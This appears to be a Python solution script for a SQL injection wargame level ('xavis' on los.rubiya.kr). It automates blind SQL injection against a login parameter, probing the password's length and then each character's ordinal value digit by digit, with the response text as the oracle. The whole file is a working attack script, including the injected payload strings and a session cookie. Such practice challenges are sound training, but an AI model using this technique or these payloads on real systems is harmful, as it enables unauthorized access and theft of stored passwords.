import requests
import string
import codecs

session = requests.Session()

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=' or (length(pw)={});%23"
cookies = {"PHPSESSID": "t7lk6agpg5227q87cropdh21bo"}
#for i in range(100):
#    print(i,url.format(i))
#    r=requests.get(url.format(i),cookies=cookies)
#    if('Hello admin' in r.text[:200]):
#        leng=i
#        print("Length", i)
#        break
leng=3
url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=' or id='admin' and (substr(ord(substr(pw,{},1)),{},1)='{}');%23"
w=""
for i in range(1,leng+1):
    pw=""
    for j in range(1,6):
        for k in "0123456789":
            print(i,url.format(i,j,k))
            r = requests.get(url.format(i,j,k), cookies=cookies)
            if('Hello admin' in r.text[:200]):
                pw += k
                print("wtf :", pw)
                break
    w+=chr(int(pw))
    print(pw,w)
print("Password :",w)